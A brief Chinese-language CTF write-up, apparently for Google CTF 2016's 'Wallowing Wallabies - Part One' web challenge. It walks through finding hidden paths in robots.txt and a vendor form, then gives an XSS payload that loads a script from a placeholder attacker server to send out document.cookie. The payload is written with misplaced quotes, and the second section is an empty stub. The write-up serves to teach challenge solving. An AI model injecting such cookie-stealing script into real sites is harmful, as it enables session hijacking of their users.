# Google CTF 2016 Web

1. Wallowing Wallabies - Part One
    - 题面上可以使用的功能为零，源码里也没有什么切入点。
    - 查看各种套路，发现`robots.txt`
        ```
        User-agent: *
        Disallow: /deep-blue-sea/
        Disallow: /deep-blue-sea/team/
        # Yes, these are alphabet puns :)
        Disallow: /deep-blue-sea/team/characters
        Disallow: /deep-blue-sea/team/paragraphs
        Disallow: /deep-blue-sea/team/lines
        Disallow: /deep-blue-sea/team/runes
        Disallow: /deep-blue-sea/team/vendors
        ```
    - 发现其中`/deep-blue-sea/team/vendors`可以访问，页面内容为：
      > Hello!
      > If you've been directed to this webpage; you have been requested to file out for vendor level access to our system.
      > To request access; please fill out your form, and an admin will review your application as soon as possible.

    - 预计会有XSS漏洞出现，随便点东西提交：
      > Thank you, your request has been received
      > Your message to the admins is as follows:
      > !!! Expecting to find '<script src=' in your input -- please re-read the level challenge.

    - So赤果果的提示，构造playload `<script src="http://yourwebserver?cookie=+'document.cookie'`

2.
